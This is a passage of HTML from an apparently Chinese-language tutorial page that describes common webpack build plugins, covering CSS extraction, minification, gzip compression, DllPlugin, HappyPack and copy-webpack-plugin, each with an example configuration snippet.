class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="extract-text-webpack-plugin"><a href="#extract-text-webpack-plugin" class="headerlink" title="extract-text-webpack-plugin"></a>extract-text-webpack-plugin</h2><p>将 css 成生文件，而非内联 。该插件的主要是为了抽离 css 样式,防止将样式打包在 js 中引起页面样式加载错乱的现象</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> ExtractTextPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'extract-text-webpack-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token comment" spellcheck="true">// 将css分离到/dist文件夹下的css文件夹中的index.css</span>  <span class="token keyword">new</span> <span class="token class-name">ExtractTextPlugin</span><span class="token punctuation">(</span><span class="token string">'css/index.css'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mini-css-extract-plugin"><a href="#mini-css-extract-plugin" class="headerlink" title="mini-css-extract-plugin"></a>mini-css-extract-plugin</h2><p>将 CSS 提取为独立的文件的插件，对每个包含 css 的 js 文件都会创建一个 CSS 文件，支持按需加载 css 和 <code>sourceMap</code>。只能用在 webpack4 中，对比另一个插件 extract-text-webpack-plugin 有以下特点:</p><ul><li>异步加载</li><li>不重复编译，性能更好</li><li>更容易使用</li><li>只针对 CSS</li></ul><p>这个插件应该只用在生产环境配置，并且在 <code>loaders</code> 链中不使用 <code>style-loader</code>, 而且这个插件暂时不支持 HMR</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> MiniCssExtractPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mini-css-extract-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.(le|c)ss$/</span><span class="token punctuation">,</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">{</span>            loader<span class="token punctuation">:</span> MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span>            options<span class="token punctuation">:</span> <span class="token punctuation">{</span>              publicPath<span class="token punctuation">:</span> <span class="token string">'../'</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span><span class="token punctuation">,</span>          <span class="token string">'postcss-loader'</span><span class="token punctuation">,</span>          <span class="token string">'less-loader'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      filename<span class="token punctuation">:</span> <span class="token string">'css/[name].[contenthash:8].css'</span><span class="token punctuation">,</span>      chunkFilename<span class="token punctuation">:</span> <span class="token string">'css/[id].[contenthash:8].css'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="purifycss-webpack"><a href="#purifycss-webpack" class="headerlink" title="purifycss-webpack"></a>purifycss-webpack</h2><p>有时候我们 css 写得多了或者重复了，这就造成了多余的代码，我们希望在生产环境进行去除。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> PurifyCssWebpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'purifycss-webpack'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 引入PurifyCssWebpack插件</span><span class="token keyword">const</span> glob <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'glob'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 引入glob模块,用于扫描全部html文件中所引用的css</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>common<span class="token punctuation">,</span> <span class="token punctuation">{</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">PurifyCssWebpack</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      paths<span class="token punctuation">:</span> glob<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'src/*.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="optimize-css-assets-webpack-plugin"><a href="#optimize-css-assets-webpack-plugin" class="headerlink" title="optimize-css-assets-webpack-plugin"></a>optimize-css-assets-webpack-plugin</h2><p>我们希望减小 css 打包后的体积，可以用到 <code>optimize-css-assets-webpack-plugin</code>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> OptimizeCSSAssetsPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"optimize-css-assets-webpack-plugin"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 压缩css代码</span>optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>  minimizer<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// 压缩css</span>    <span class="token keyword">new</span> <span class="token class-name">OptimizeCSSAssetsPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UglifyJsPlugin"><a href="#UglifyJsPlugin" class="headerlink" title="UglifyJsPlugin"></a>UglifyJsPlugin</h2><p><code>uglifyJsPlugin</code> 是 <code>vue-cli</code> 默认使用的压缩代码方式，用来对 js 文件进行压缩，从而减小 js 文件的大小，加速 load 速度。它使用的是单线程压缩代码，打包时间较慢，所以可以在开发环境将其关闭，生产环境部署时再把它打开。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> UglifyJsPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'uglifyjs-webpack-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">UglifyJsPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    uglifyOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span>      compress<span class="token punctuation">:</span> <span class="token punctuation">{</span>        warnings<span class="token punctuation">:</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//是否启用文件缓存</span>    parallel<span class="token punctuation">:</span> <span class="token boolean">true</span>   <span class="token comment" spellcheck="true">//使用多进程并行运行来提高构建速度</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ParallelUglifyPlugin"><a href="#ParallelUglifyPlugin" class="headerlink" title="ParallelUglifyPlugin"></a>ParallelUglifyPlugin</h2><p>开启多个子进程，把对多个文件压缩的工作分别给多个子进程去完成，每个子进程其实还是通过 <code>UglifyJS</code> 去压缩代码，但是变成了并行执行。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> ParallelUglifyPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-parallel-uglify-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">ParallelUglifyPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//cacheDir 用于配置缓存存放的目录路径。</span>    cacheDir<span class="token punctuation">:</span> <span class="token string">'.cache/'</span><span class="token punctuation">,</span>    sourceMap<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    uglifyJS<span class="token punctuation">:</span> <span class="token punctuation">{</span>      output<span class="token punctuation">:</span> <span class="token punctuation">{</span>        comments<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      compress<span class="token punctuation">:</span> <span class="token punctuation">{</span>        warnings<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="terser-webpack-plugin"><a href="#terser-webpack-plugin" class="headerlink" title="terser-webpack-plugin"></a>terser-webpack-plugin</h2><p>Webpack4.0 默认是使用 <code>terser-webpack-plugin</code> 这个压缩插件，在此之前是使用 <code>uglifyjs-webpack-plugin</code>，两者的区别是后者对 ES6 的压缩不是很好，同时我们可以开启 <code>parallel</code> 参数，使用多进程压缩，加快压缩。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> TerserPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'terser-webpack-plugin'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 压缩js代码</span>optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>  minimizer<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">TerserPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      parallel<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 开启几个进程来处理压缩，默认是 os.cpus().length - 1</span>      cache<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 是否缓存</span>      sourceMap<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="NoErrorsPlugin"><a href="#NoErrorsPlugin" class="headerlink" title="NoErrorsPlugin"></a>NoErrorsPlugin</h2><p>报错但不退出 webpack 进程。编译出现错误时，使用 <code>NoEmitOnErrorsPlugin</code> 来跳过输出阶段。这样可以确保输出资源不会包含错误。</p><pre class="line-numbers language-js"><code class="language-js">plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>NoEmitOnErrorsPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="compression-webpack-plugin"><a href="#compression-webpack-plugin" class="headerlink" title="compression-webpack-plugin"></a>compression-webpack-plugin</h2><p>所有现代浏览器都支持 <code>gzip</code> 压缩，启用 <code>gzip</code> 压缩可大幅缩减传输资源大小，从而缩短资源下载时间，减少首次白屏时间，提升用户体验。</p><p>gzip 对基于文本格式文件的压缩效果最好（如：CSS、JavaScript 和 HTML），在压缩较大文件时往往可实现高达 70-90% 的压缩率，对已经压缩过的资源（如：图片）进行 gzip 压缩处理，效果很不好。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> CompressionPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'compression-webpack-plugin'</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">CompressionPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// gzip压缩配置</span>    test<span class="token punctuation">:</span> <span class="token regex">/\.js$|\.html$|\.css/</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 匹配文件名</span>    threshold<span class="token punctuation">:</span> <span class="token number">10240</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 对超过10kb的数据进行压缩</span>    deleteOriginalAssets<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 是否删除原文件</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，这个方法还需要后端配置支持。</p><h2 id="DefinePlugin"><a href="#DefinePlugin" class="headerlink" title="DefinePlugin"></a>DefinePlugin</h2><p>我们可以通过 <code>DefinePlugin</code> 可以定义一些全局的变量，我们可以在模块当中直接使用这些变量，无需作任何声明，<code>DefinePlugin</code> 是 <code>webpack</code> 自带的插件。</p><pre class="line-numbers language-js"><code class="language-js">plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    DESCRIPTION<span class="token punctuation">:</span> <span class="token string">'This Is The Test Text.'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">// 直接引用</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>DESCRIPTION<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ProvidePlugin"><a href="#ProvidePlugin" class="headerlink" title="ProvidePlugin"></a>ProvidePlugin</h2><p>自动加载模块。 任何时候，当 <code>identifier</code> 被当作未赋值的变量时， module 就会自动被加载，并且 <code>identifier</code> 会被这个 module 输出的内容所赋值。这是 webpack 自带的插件。</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  resolve<span class="token punctuation">:</span> <span class="token punctuation">{</span>    alias<span class="token punctuation">:</span> <span class="token punctuation">{</span>      jquery<span class="token punctuation">:</span> <span class="token string">'./lib/jquery'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">//提供全局的变量，在模块中使用无需用require引入</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>ProvidePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      $<span class="token punctuation">:</span> <span class="token string">'jquery'</span><span class="token punctuation">,</span>      React<span class="token punctuation">:</span> <span class="token string">'react'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DLLPlugin"><a href="#DLLPlugin" class="headerlink" title="DLLPlugin"></a>DLLPlugin</h2><p>这是在一个额外的独立的 webpack 设置中创建一个只有 dll 的 <code>bundle(dll-only-bundle)</code>。 这个插件会生成一个名为 <code>manifest.json</code> 的文件，这个文件是用来让 <code>DLLReferencePlugin</code> 映射到相关的依赖上去的。</p><p><strong>使用步骤如下</strong></p><p>1、在 build 下创建 <code>webpack.dll.config.js</code></p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> webpack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  entry<span class="token punctuation">:</span> <span class="token punctuation">{</span>    vendor<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token string">'vue-router'</span><span class="token punctuation">,</span>      <span class="token string">'vuex'</span><span class="token punctuation">,</span>      <span class="token string">'vue/dist/vue.common.js'</span><span class="token punctuation">,</span>      <span class="token string">'vue/dist/vue.js'</span><span class="token punctuation">,</span>      <span class="token string">'vue-loader/lib/component-normalizer.js'</span><span class="token punctuation">,</span>      <span class="token string">'vue'</span><span class="token punctuation">,</span>      <span class="token string">'axios'</span><span class="token punctuation">,</span>      <span class="token string">'echarts'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'./dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    filename<span class="token punctuation">:</span> <span class="token string">'[name].dll.js'</span><span class="token punctuation">,</span>    library<span class="token punctuation">:</span> <span class="token string">'[name]_library'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DllPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'./dist'</span><span class="token punctuation">,</span> <span class="token string">'[name]-manifest.json'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      name<span class="token punctuation">:</span> <span class="token string">'[name]_library'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 建议加上代码压缩插件，否则dll包会比较大。</span>    <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>optimize<span class="token punctuation">.</span>UglifyJsPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      compress<span class="token punctuation">:</span> <span class="token punctuation">{</span>        warnings<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、在 <code>webpack.prod.conf.js</code> 的 plugin 后面加入配置</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DllReferencePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  manifest<span class="token punctuation">:</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../dist/vendor-manifest.json'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、<code>package.json</code>文件中添加快捷命令<code>(build:dll)</code></p><pre class="line-numbers language-js"><code class="language-js">  <span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"dev"</span><span class="token punctuation">:</span> <span class="token string">"webpack-dev-server --inline --progress --config build/webpack.dev.conf.js"</span><span class="token punctuation">,</span>    <span class="token string">"start"</span><span class="token punctuation">:</span> <span class="token string">"npm run dev"</span><span class="token punctuation">,</span>    <span class="token string">"lint"</span><span class="token punctuation">:</span> <span class="token string">"eslint --ext .js,.vue src"</span><span class="token punctuation">,</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"node build/build.js"</span><span class="token punctuation">,</span>    <span class="token string">"build:dll"</span><span class="token punctuation">:</span> <span class="token string">"webpack --config build/webpack.dll.conf.js"</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生产环境打包的时候先<code>npm run build:dll</code>命令会在打包目录下生成 <code>vendor-manifest.json</code> 文件与 vendor.dll.js 文件。然后<code>npm run build</code>生产其他文件。</p><p>4、根目录下的入口 <code>index.html</code> 加入引用</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> src<span class="token operator">=</span><span class="token string">"./vendor.dll.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HappyPack"><a href="#HappyPack" class="headerlink" title="HappyPack"></a>HappyPack</h2><p><code>HappyPack</code> 能让 webpack 把任务分解给多个子进程去并发的执行，子进程处理完后再把结果发送给主进程。要注意的是 <code>HappyPack</code> 对 <code>file-loader</code>、<code>url-loader</code> 支持的不友好，所以不建议对该 loader 使用。</p><p>1、HappyPack 插件安装</p><pre class="line-numbers language-js"><code class="language-js">npm i <span class="token operator">-</span>D happypack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、<code>webpack.base.conf.js</code> 文件对 module.rules 进行配置</p><pre class="line-numbers language-js"><code class="language-js">module<span class="token punctuation">:</span> <span class="token punctuation">{</span>  rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      test<span class="token punctuation">:</span> <span class="token regex">/\.js$/</span><span class="token punctuation">,</span>      use<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'happypack/loader?id=babel'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      include<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      exclude<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'node_modules'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>      test<span class="token punctuation">:</span> <span class="token regex">/\.vue$/</span><span class="token punctuation">,</span>      use<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'happypack/loader?id=vue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、在生产环境 <code>webpack.prod.conf.js</code> 文件进行配置</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> HappyPack <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'happypack'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 构造出共享进程池，在进程池中包含5个子进程</span><span class="token keyword">const</span> HappyPackThreadPool <span class="token operator">=</span> HappyPack<span class="token punctuation">.</span><span class="token function">ThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">{</span> size<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>  <span class="token keyword">new</span> <span class="token class-name">HappyPack</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 用唯一的标识符id，来代表当前的HappyPack是用来处理一类特定的文件</span>    id<span class="token punctuation">:</span> <span class="token string">'babel'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 如何处理.js文件，用法和Loader配置中一样</span>    loaders<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader?cacheDirectory'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    threadPool<span class="token punctuation">:</span> HappyPackThreadPool<span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">new</span> <span class="token class-name">HappyPack</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    id<span class="token punctuation">:</span> <span class="token string">'vue'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 用唯一的标识符id，来代表当前的HappyPack是用来处理一类特定的文件</span>    loaders<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        loader<span class="token punctuation">:</span> <span class="token string">'vue-loader'</span><span class="token punctuation">,</span>        options<span class="token punctuation">:</span> vueLoaderConfig<span class="token punctuation">,</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    threadPool<span class="token punctuation">:</span> HappyPackThreadPool<span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意，当项目较小时，多线程打包反而会使打包速度变慢。</strong></p><h2 id="copy-webpack-plugin"><a href="#copy-webpack-plugin" class="headerlink" title="copy-webpack-plugin"></a>copy-webpack-plugin</h2><p>我们在 <code>public/index.html</code> 中引入了静态资源，但是打包的时候 webpack 并不会帮我们拷贝到 dist 目录，因此 <code>copy-webpack-plugin</code> 就可以很好地帮我做拷贝的工作了。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> CopyWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'copy-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">CopyWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      patterns<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>          <span class="token keyword">from</span><span class="token punctuation">:</span> <span class="token string">'public/js/*.js'</span><span class="token punctuation">,</span>          to<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">,</span> <span class="token string">'js'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          flatten<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IgnorePlugin"><a href="#IgnorePlugin" class="headerlink" 